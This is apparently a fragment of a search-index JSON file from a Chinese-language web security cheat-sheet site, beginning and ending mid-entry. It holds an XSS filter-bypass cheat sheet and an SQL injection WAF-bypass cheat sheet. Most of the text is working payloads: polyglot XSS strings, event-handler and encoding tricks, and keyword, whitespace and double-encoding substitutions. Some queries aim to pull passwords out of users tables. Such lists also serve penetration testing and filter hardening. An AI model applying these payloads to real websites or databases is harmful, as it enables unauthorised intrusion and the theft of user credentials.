\u5b57\u7b26                              \u4f7f\u7528                              \u591a\u6bb5\u4ee3\u7801            \n            141                             DOM\u548c\u975eDOM                                javascript:\u201d/*\u2019/*`/*\u2013&gt;&lt;/noscript&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/template&gt;&lt;/noembed&gt;&lt;/script&gt;&lt;html \\\u201d onmouseover=/*&lt;svg/*/onload=alert()//&gt;            \n            88                              \u975eDOM                                \u201c\u2018\u2013&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;script&gt;alert()&lt;/script&gt;            \n            95                              DOM                             \u2018\u201d\u2013&gt;&lt;/title&gt;&lt;/textarea&gt;&lt;/style&gt;&lt;/noscript&gt;&lt;/noembed&gt;&lt;/template&gt;&lt;/frameset&gt;&lt;svg onload=alert()&gt;            \n            54                              \u975eDOM                                \u201c\u2018&gt;\u2013&gt;*/&lt;/noscript&gt;&lt;/ti tle&gt;&lt;script&gt;alert()&lt;/script&gt;            \n            42                              DOM                             \u201c\u2018\u2013&gt;&lt;/style&gt;&lt;/script&gt;&lt;svg onload=alert()&gt;  \n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/","title":"XSS\u7ed5\u8fc7\u901f\u67e5\u8868","text":""},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#xss","title":"XSS\u7ed5\u8fc7\u6280\u5de7","text":""},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_1","title":"\u524d\u8a00","text":"<p>XSS\u662fWeb\u5e94\u7528\u7a0b\u5e8f\u4e2d\u5e38\u89c1\u7684\u6f0f\u6d1e\u4e4b\u4e00\uff0c\u7f51\u7ad9\u7ba1\u7406\u5458\u53ef\u4ee5\u901a\u8fc7\u7528\u6237\u8f93\u5165\u8fc7\u6ee4\u3001\u6839\u636e\u4e0a\u4e0b\u6587\u8f6c\u6362\u8f93\u51fa\u6570\u636e\u3001\u6b63\u786e\u4f7f\u7528DOM\u3001\u5f3a\u5236\u6267\u884c\u8de8\u6e90\u8d44\u6e90\u5171\u4eab\uff08CORS\uff09\u7b56\u7565\u4ee5\u53ca\u5176\u4ed6\u7684\u5b89\u5168\u7b56\u7565\u6765\u89c4\u907fXSS\u6f0f\u6d1e\u3002\u5c3d\u7ba1\u73b0\u5728\u6709\u5f88\u591a\u9884\u9632XSS\u653b\u51fb\u7684\u6280\u672f\uff0c\u4f46Web\u5e94\u7528\u7a0b\u5e8f\u9632\u706b\u5899\uff08WAF\uff09\u6216\u81ea\u5b9a\u4e49\u6570\u636e\u8fc7\u6ee4\u5668\u662f\u76ee\u524d\u4f7f\u7528\u6bd4\u8f83\u5e7f\u6cdb\u7684\u5b89\u5168\u4fdd\u62a4\u6280\u672f\u4e86\uff0c\u5f88\u591a\u5382\u5546\u90fd\u4f1a\u5229\u7528\u8fd9\u4e9b\u6280\u672f\u6765\u62b5\u5fa1\u65b0\u578b\u7684XSS\u653b\u51fb\u5411\u91cf</p> <p>\u6709\u4e9b\u65f6\u5019\uff0c\u901a\u7528\u7684\u7ed5\u8fc7\u6280\u5de7\u5e76\u4e0d\u53ef\u884c\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u5f97\u89c2\u5bdf\u7f3a\u9677\u70b9\u7684\u5468\u56f4\u73af\u5883\uff0c\u60f3\u60f3\u5176\u5b83\u529e\u6cd5\u54af\u3002\u201c\u7325\u7410\u7ed5\u8fc7\u201d\u4e0e\u901a\u7528\u7ed5\u8fc7\u4e0d \u540c\u7684\u662f\uff0c\u5b83\u901a\u7528\u6027\u5c0f\uff0c\u5f80\u5f80\u53ea\u662f\u7279\u4f8b\u3002</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#1","title":"1.\u5355\u5f15\u53f7\u8fc7\u6ee4\u7ed5\u8fc7","text":"<p>\u5728\u6211\u4eec\u7684\u5355\u5f15\u53f7\u4e4b\u524d\u653e\u7f6e\u4e86\u4e00\u4e2a\u201c\\\u201d\uff0c\u6709\u65f6\u5019\u53cc\u5f15\u53f7\u4e4b\u524d\u4e5f\u4f1a\u653e\u7f6e\uff0c\u901a \u8fc7\u4e00\u4e9b\u7c7b\u4f3c add_slashes \u7684\u51fd\u6570\u53ef\u4ee5\u5b9e\u73b0\uff0c\u8fd9\u4e2a\u5c31\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u6211\u4eec\u5148\u524d\u7684\u4ee3\u7801\u5c31\u4f1a\u53d8\u6210\u8fd9\u6837\uff1a</p> <pre><code> &lt;INPUT type=\"text\" value='\\'&gt;&lt;SCRIPT&gt;alert(\\\"XSS\\\")&lt;/SCRIPT&gt;'&gt;\n</code></pre> <p>\u6709\u4e00\u4e9b\u65b9\u6cd5\u53ef\u4ee5\u7ee7\u7eed\uff0c\u4f46\u662f\u8981\u770b\u8fc7\u6ee4\u7684\u90a3\u4e2a\u51fd\u6570\u662f\u600e\u4e48\u653e\u7684\u4e86\u3002\u5176\u4e2d\u4e00\u4e2a\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528\u5b57\u7b26\u5b9e\u4f53\uff0c\u5b66\u8fc7 html \u7684\u90fd\u77e5\u9053\uff0c\u5c31\u662f\u4e00\u4e9b\u7279\u6b8a\u5b57\u7b26\u4f1a\u7528\u4e00\u4e9b\u56fa\u6709\u7684\u7b26\u53f7\u7ec4\u5408\u6765\u8868\u793a\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u4f60\u4e0d\u80fd\u7528&lt;&gt;\u8868\u793a\u5927\u4e8e\u548c\u5c0f\u4e8e\uff0c \u56e0\u4e3a\u8fd9\u88ab\u89e3\u91ca\u4e3a html \u6807\u7b7e\uff0c\u4f46\u662f\uff0c\u4f60\u5982\u679c\u8981\u7528\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u6765\u4ee3\u66ff\u3002</p> <pre><code>1   2   3   4\n&amp;#34;   &amp;quot;  \u201c   \u53cc\u5f15\u53f7 \n&amp;#38;   &amp;amp;   &amp;   &amp;\u7b26\u53f7 \n&amp;#60;   &amp;lt;    &lt;   \u5c0f\u4e8e\u53f7 \n&amp;#62;   &amp;gt;    &gt;   \u5927\u4e8e\u53f7\n</code></pre> <p>\u4f7f\u7528<code>&amp;quot</code>;\u6216\u8005<code>&amp;#34;</code>; \u6765\u4ee3\u66ff\u6211\u4eec\u7684\u53cc\u5f15\u53f7\uff0c\u6709\u65f6\u5019\u53ef\u4ee5\u7ed5\u8fc7\u8fc7\u6ee4</p> <p>\u4f8b\u5b50:</p> <pre><code>&lt;script&gt;alert(\"XSS\")&lt;/script&gt;\n&lt;script&gt;alert(&amp;quot;XSS&amp;quot;)&lt;/script&gt;\n&lt;script&gt;alert(&amp;#38;XSS&amp;#38;)&lt;/script&gt;\n</code></pre> <p>\u5982\u679c\u8fd9\u90fd\u88ab\u8fc7\u6ee4\u4e86\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 JavaScript \u7684 fromCharCode \u51fd\u6570\uff0c\u8fd9\u4e2a\u51fd\u6570\u628a\u6307\u5b9a\u7684 Unicode\u503c\u8f6c\u6362\u6210\u5b57\u7b26\u4e32</p> <p>\u4f8b\u5b50</p> <pre><code>&lt;script&gt;alert(\"XSS\")&lt;/script&gt;\n&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#2script","title":"2.<code>&lt;SCRIPT&gt;</code>\u8fc7\u6ee4\u7ed5\u8fc7","text":"<p>\u6709\u4e9b\u8fc7\u6ee4\u5668\u4f1a\u8fc7\u6ee4\u5230<code>&lt;script&gt;</code>\u6807\u7b7e\uff0c\u90a3\u4e0a\u9762\u7684\u4f8b\u5b50\u5c31\u90fd\u5e9f\u4e86\uff0c\u4f46\u662f\u3002\u8fd8\u662f\u6709\u65b9\u6cd5\u63d2\u5165 javascript \u7684\u3002\u6211\u4eec\u770b\u770b\u4e8b\u4ef6\u5904\u7406\u5668\u7684\u4f8b\u5b50\u3002</p> <pre><code>&lt;BODY onload=\"alert('XSS')\"&gt;\n</code></pre> <p>\u5728 html \u91cc\u554a\u3002\u8fd9\u4e2a Onload \u5173\u952e\u5b57\u5c31\u662f\u4e00\u4e2a\u4e8b\u4ef6\uff0c\u5176\u4ed6\u7684\u6240\u6709\u6807\u7b7e\u90fd\u6ca1\u6709\u8fd9\u4e2a\u5c5e\u6027\uff0c\u4f46\u662f Body \u6807\u7b7e\u662f\u6709\u7684\u3002\u4f46\u662f\uff0c\u6709\u4e00\u5b9a\u7684\u5c40\u9650\u6027\uff0c\u5982\u679c onload \u4e8b\u4ef6\u5728\u4f60\u7684\u4ee3\u7801\u4e4b\u524d\u5df2\u7ecf\u88ab\u5904\u7406\u4e86\u3002\u90a3\u5c31\u4e0d\u4f1a\u89e6\u53d1\u4e86\u3002\u3002\u4e0d\u8fc7\u6211\u4eec\u53ef\u4ee5\u7ee7\u7eed\u770b\u770b onerror \u4e8b\u4ef6\u5904\u7406\u3002</p> <pre><code>&lt;IMG SRC=\"\" onerror=\"alert('XSS')\"&gt;\n&lt;IMG SRC=/ onerror=\"alert(String.fromCharCode(88,83,83))\"&gt;&lt;/img&gt;\n</code></pre> <p>\u6ce8\u610f\u770b\uff0c\u56fe\u7247\u6ca1\u6709\u6307\u5b9a\uff0c\u4e5f\u5c31\u662f\u51fa\u9519\u4e86\u3002Onerror \u8fd9\u4e2a\u4e8b\u4ef6\u5c31\u4f1a\u53d1\u8336\u3002\u5f15\u53d1 XSS \u6f0f\u6d1e\uff0c\u6ca1\u6709\u7528<code>&lt;script&gt;</code> \u6807\u7b7e\u54e6\u3002</p> <p>\u5982\u679c\u662f\u628a<code>&lt;script&gt;</code>\u548c<code>&lt;/script&gt;</code>\u6807\u7b7e\u8fc7\u6ee4\u6389\uff0c\u90a3\u4e48\u53ef\u4ee5\u7528</p> <pre><code>&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;script&gt;ipt&gt;\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#3input","title":"3.(Input)\u6807\u7b7e\u5c5e\u6027\u7ed5\u8fc7","text":"<pre><code>&lt;INPUT type=\"text\" value='&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'&gt;\n</code></pre> <p>\u95ed\u5408<code>&lt;input&gt;</code></p> <pre><code>'&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\n</code></pre> <p>\u73b0\u5728\u6211\u4eec\u7684\u4ee3\u7801\u6267\u884c\u4e86\u3002\u56e0\u4e3a\u6211\u4eec\u95ed\u5408\u4e86\u524d\u9762\u7684 html \u6807\u7b7e\uff0c\u5c31\u89e6\u53d1\u4e86 XSS\uff0c\u4f46\u662f\uff0c\u4f60\u53ef\u80fd\u4f1a\u53d1\u73b0\uff0c\u9875\u9762\u4e0a\u4f1a\u663e\u793a\u4e00\u4e2a\u591a\u51fa\u6765\u7684\u5355\u5f15\u53f7\uff0c\u4e3a\u4ec0\u4e48\uff0c\u56e0\u4e3a\u540e\u9762\u7684\u90a3\u4e2a\u539f\u6765\u7684\u5355\u5f15\u53f7\u6ca1\u6709\u5339\u914d\uff0c\u6211\u4eec\u7ee7\u7eed\u4fee\u6539\u6211\u4eec\u7684\u4ee3\u7801\u3002</p> <pre><code>'&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;&lt;xss a='\n</code></pre> <p>\u6240\u6709\u7684\u8f93\u5165\u5c31\u4f1a\u53d8\u6210\u8fd9\u6837\uff1a</p> <pre><code>&lt;INPUT type=\"text\" value=''&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;&lt;xss a=''&gt;\n</code></pre> <p>Javascript \u4ee3\u7801\u5c31\u6ce8\u5165\u4e86\u3002<code>&lt;xss a=\u201d&gt;</code>\u8fd9\u4e2a\u6ca1\u4ec0\u4e48\u610f\u4e49\uff0c\u4f60\u53ef\u4ee5\u81ea\u5df1\u6539\uff0c\u4f46\u662f\u7b26\u5408 html \u7684\u6807\u51c6\uff0c \u9875\u9762\u4e0d\u4f1a\u51fa\u9519\u3002</p>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#4","title":"4.\u5927\u5c0f\u5199\u6df7\u7528\u7ed5\u8fc7","text":"<pre><code>&lt;iMgSRC = \"JavaScript:alert(0);\"&gt;\n</code></pre> <p>\u4e0d\u4f7f\u7528\u5f15\u53f7\u6216\u8005\u6784\u9020\u5168\u89d2\u5b57\u7b26\u4e5f\u80fd\u6270\u4e71\u8fc7\u6ee4\u89c4\u5219</p> <p>\u8fd8\u6709\u50cfCSS\u4e2d/**/\u4f1a\u88ab\u6d4f\u89c8\u5668\u5ffd\u7565\uff0c\\\u548c\\0\u540c\u6837\u6216\u88ab\u6d4f\u89c8\u5668\u5ffd\u7565\uff0c\u540c\u6837\u53ef\u4ee5\u7528\u6765\u7ed5\u8fc7\uff1a</p> <pre><code>&lt;img src =\"java/*javascript:alert(\u2018xss\u2018)*/script:alert(1);\"&gt;\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#5magic_quotes_gpc","title":"5.<code>magic_quotes_gpc</code>\u7ed5\u8fc7","text":"<pre><code>&lt;script&gt;String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34, 41, 59)&lt;/script&gt;\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#6","title":"6.\u5206\u53f7\u5f15\u53f7\u8fc7\u6ee4\u7ed5\u8fc7","text":"<pre><code>&lt;IMG SRC=javascript:alert('XSS')&gt;\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#7","title":"7.\u62ec\u53f7\u88ab\u8fc7\u6ee4\u7ed5\u8fc7","text":"<p>\u5f53\u62ec\u53f7\u88ab\u8fc7\u6ee4\u7684\u65f6\u5019\u53ef\u4ee5\u4f7f\u7528throw\u6765\u7ed5\u8fc7</p> <pre><code>&lt;a onmouseover=\"javascript:window.onerror=alert;throw 1&gt;\n&lt;img src=x onerror=\"javascript:window.onerror=alert;throw 1\"&gt;\n</code></pre> <p>\u4ee5\u4e0a\u4e24\u4e2a\u6d4b\u8bd5\u5411\u91cf\u5728Chrome\u8ddfIE\u5728\u4e0a\u9762\u4f1a\u51fa\u73b0\u4e00\u4e2a\u201cuncaught\u201d\u7684\u9519\u8bef\uff0c\u53ef\u4ee5\u7528\u4ee5\u4e0b\u7684\u5411\u91cf\uff1a</p> <pre><code>&lt;body/onload=javascript:window.onerror=eval;throw'=alert\\x281\\x29';&gt;\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/XSS%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#8","title":"8.= ( ) ; :\u88ab\u8fc7\u6ee4\u65f6\u7ed5\u8fc7","text":"<pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40;/1/&amp;#41;&lt;/script&gt; // \u901a\u6740\u6240\u6709\u6d4f\u89c8\u5668\n</code></pre> <p>opera\u4e2d\u53ef\u4ee5\u4e0d\u95ed\u5408</p> <pre><code>&lt;svg&gt;&lt;script&gt;alert&amp;#40; 1&amp;#41; // Opera\u53ef\u67e5\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/","title":"Sql\u6ce8\u5165\u7ed5\u8fc7\u901f\u67e5\u8868","text":""},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#sql","title":"SQL\u6ce8\u5165\u7ed5\u8fc7\u901f\u67e5\u8868","text":""},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#and-or","title":"\u8fc7\u6ee4and or","text":"<pre><code>or     \u2014\u2014&gt;    ||\nand     \u2014\u2014&gt;    &amp;&amp;\nxor \u2014\u2014&gt; |   \nnot \u2014\u2014&gt; !\n\n\u5341\u516d\u8fdb\u5236\u7ed5\u8fc7\nor \u2014\u2014&gt; o\\x72\n\n\u5927\u5c0f\u5199\u7ed5\u8fc7\nOr\naNd\n\n\u53cc\u5199\u7ed5\u8fc7\noorr\nanandd\n\nurlencode\uff0cascii(char)\uff0chex\uff0cunicode\u7f16\u7801\u7ed5\u8fc7\n    \u4e00\u4e9bunicode\u7f16\u7801\u4e3e\u4f8b\uff1a\n    \u5355\u5f15\u53f7\uff1a'\n    %u0027 %u02b9 %u02bc\n    %u02c8 %u2032\n    %uff07 %c0%27\n    %c0%a7 %e0%80%a7\n\n\n\u5173\u952e\u5b57\u5185\u8054\u6ce8\u91ca\u5c1d\u8bd5\u7ed5\u6240\u6709\n/*!or*/\n/*!and*/\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_1","title":"\u5de6\u62ec\u53f7\u8fc7\u6ee4","text":"<pre><code>urlencode\uff0cascii(char)\uff0chex\uff0cunicode\u7f16\u7801\u7ed5\u8fc7\n%u0028 %uff08\n%c0%28 %c0%a8\n%e0%80%a8\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_2","title":"\u53f3\u62ec\u53f7\u8fc7\u6ee4","text":"<pre><code>urlencode\uff0cascii(char)\uff0chex\uff0cunicode\u7f16\u7801\u7ed5\u8fc7\n%u0029 %uff09\n%c0%29 %c0%a9\n%e0%80%a9\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#unionselect","title":"\u8fc7\u6ee4union\\select","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\n\u4f8b\uff1a\n\u8fc7\u6ee4\u4ee3\u7801 union select user,password from users\n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; (select user from users where userid=1)='admin'\n\n\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u7ed5\u8fc7\nselect \u2014\u2014&gt; selec\\x74\nunion\u2014\u2014&gt;unio\\x6e\n\n\u5927\u5c0f\u5199\u7ed5\u8fc7\nSelEct\n\n\u53cc\u5199\u7ed5\u8fc7\nselselectect\nuniunionon\n\nurlencode\uff0cascii(char)\uff0chex\uff0cunicode\u7f16\u7801\u7ed5\u8fc7\n\n\u5173\u952e\u5b57\u5185\u8054\u7ed5\u6240\u6709\n/*!union*/\n/*!select*/\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_3","title":"\u8fc7\u6ee4\u7a7a\u683c","text":"<pre><code>\u7528Tab\u4ee3\u66ff\u7a7a\u683c%20 %09 %0a %0b %0c %0d %a0 /**/()\n\u7ed5\u8fc7\u7a7a\u683c\u6ce8\u91ca\u7b26\u7ed5\u8fc7//--%20/**/#--+-- -;%00;\n\n\u7a7a\u767d\u5b57\u7b26\u7ed5\u8fc7SQLite3  \u2014\u2014     0A,0D,0c,09,20\nMYSQL\n    09,0A,0B,0B,0D,A0,20\nPosgressSQL\n    0A,0D,0C,09,20\nOracle_11g\n    00,0A,0D,0C,09,20\nMSSQL\n    01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,OF,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20\n\u7279\u6b8a\u7b26\u53f7\u7ed5\u8fc7\n    `  +  \uff01\n\u7b49\u79d1\u5b66\u8ba1\u6570\u6cd5\u7ed5\u8fc7\n    \u4f8b\uff1a\n    select user,password from users where user_id0e1union select 1,2\nunicode\u7f16\u7801\n    %u0020 %uff00\n    %c0%20 %c0%a0 %e0%80%a0\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_4","title":"\u8fc7\u6ee4=","text":"<pre><code>?id=1' or 1 like 1#\u53ef\u4ee5\u7ed5\u8fc7\u5bf9 = &gt; \u7b49\u8fc7\u6ee4\nor '1' IN ('1234')#\u53ef\u4ee5\u66ff\u4ee3=\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_5","title":"\u8fc7\u6ee4\u6bd4\u8f83\u7b26&lt;&gt;","text":"<pre><code>select*fromuserswhereid=1and ascii(substr(database(),0,1))&gt;64\n\nselect*fromuserswhereid=1and greatest(ascii(substr(database(),0,1)),64)=64\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#where","title":"\u8fc7\u6ee4where","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\n\u8fc7\u6ee4\u4ee3\u7801 1 &amp;&amp; (select user from users where user_id = 1) = 'admin'\n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; (select user from users limit 1) = 'admin'\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#limit","title":"\u8fc7\u6ee4limit","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\n\u8fc7\u6ee4\u4ee3\u7801 1 &amp;&amp; (select user from users limit 1) = 'admin'\n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'#user_id\u805a\u5408\u4e2duser_id\u4e3a1\u7684user\u4e3aadmin\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#group-by","title":"\u8fc7\u6ee4group by","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\n\u8fc7\u6ee4\u4ee3\u7801 1 &amp;&amp; (select user from users group by user_id having user_id = 1) = 'admin'\n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#select","title":"\u8fc7\u6ee4select","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\n\u8fc7\u6ee4\u4ee3\u7801 1 &amp;&amp; (select substr(group_concat(user_id),1,1) user from users ) = 1\n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; substr(user,1,1) = 'a'\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_6","title":"\u8fc7\u6ee4\u2019(\u5355\u5f15\u53f7)","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\nwaf = 'and|or|union|where|limit|group by|select|\\''\n\u8fc7\u6ee4\u4ee3\u7801 1 &amp;&amp; substr(user,1,1) = 'a'\n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; user_id is not null1 &amp;&amp; substr(user,1,1) = 0x611 &amp;&amp; substr(user,1,1) = unhex(61)\n\n\n\u5bbd\u5b57\u8282\u7ed5\u8fc7\n%bf%27 %df%27 %aa%27\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_7","title":"\u8fc7\u6ee4\u9017\u53f7","text":"<pre><code>\u5728\u4f7f\u7528\u76f2\u6ce8\u7684\u65f6\u5019\uff0c\u9700\u8981\u4f7f\u7528\u5230substr(),mid(),limit\u3002\u8fd9\u4e9b\u5b50\u53e5\u65b9\u6cd5\u90fd\u9700\u8981\u4f7f\u7528\u5230\u9017\u53f7\u3002\u5bf9\u4e8esubstr()\u548cmid()\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u4f7f\u7528from to\u7684\u65b9\u5f0f\u6765\u89e3\u51b3\uff1a\nselectsubstr(database(0from1for1);selectmid(database(0from1for1);\n\n\u5bf9\u4e8elimit\u53ef\u4ee5\u4f7f\u7528offset\u6765\u7ed5\u8fc7\uff1a\n\nselect*fromnews limit0,1# \u7b49\u4ef7\u4e8e\u4e0b\u9762\u8fd9\u6761SQL\u8bed\u53e5select*fromnews limit1offset0\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#hex","title":"\u8fc7\u6ee4hex","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\n\u8fc7\u6ee4\u4ee3\u7801 1 &amp;&amp; substr(user,1,1) = unhex(61)\n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) #\u5341\u8fdb\u5236\u768411\u8f6c\u5316\u4e3a\u5341\u516d\u8fdb\u5236\uff0c\u5e76\u5c0f\u5199\u3002\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#substr","title":"\u8fc7\u6ee4substr","text":"<pre><code>\u903b\u8f91\u7ed5\u8fc7\n\n\u8fc7\u6ee4\u4ee3\u7801 1 &amp;&amp; substr(user,1,1) = lower(conv(11,10,16)) \n\u7ed5\u8fc7\u65b9\u5f0f 1 &amp;&amp; lpad(user(),1,1) in 'r'\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_8","title":"\u7f16\u7801\u7ed5\u8fc7","text":"<p>\u5229\u7528urlencode\uff0cascii(char)\uff0chex\uff0cunicode\u7b49\u7f16\u7801\u7ed5\u8fc7</p> <pre><code>or 1=1\u5373%6f%72%20%31%3d%31\uff0c\u800cTest\u4e5f\u53ef\u4ee5\u4e3aCHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)\u3002\n\n\u5341\u516d\u8fdb\u5236\u7f16\u7801\nSELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))\n\n\u53cc\u91cd\u7f16\u7801\u7ed5\u8fc7\n?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+\n</code></pre>"},{"location":"%E9%80%9F%E6%9F%A5%E8%A1%A8/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E9%80%9F%E6%9F%A5%E8%A1%A8/#_9","title":"\u7b49\u4ef7\u51fd\u6570\u6216\u53d8\u91cf","text":"<pre><code>hex()\u3001bin() ==&gt; ascii()\n\nsleep() ==&gt;benchmark()\n\nconcat_ws()==&gt;group_concat()\n\nmid()\u3001substr() ==&gt; substring()\n\n@@user ==&gt; user()\n\n@@datadir ==&gt; datadir()\n\n\u4e3e\u4f8b\uff1asubstring()\u548csubstr()\u65e0\u6cd5\u4f7f\u7528\u65f6\uff1a?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74\u3000\n\n\u6216\u8005\uff1a\nsubstr((select 'password'),1,1) = 0x70\nstrcmp(left('password',1), 0x69) = 1\nstrcmp(left('password',1), 0x70) = 0\nstrcmp(left('password',1), 0x71) = 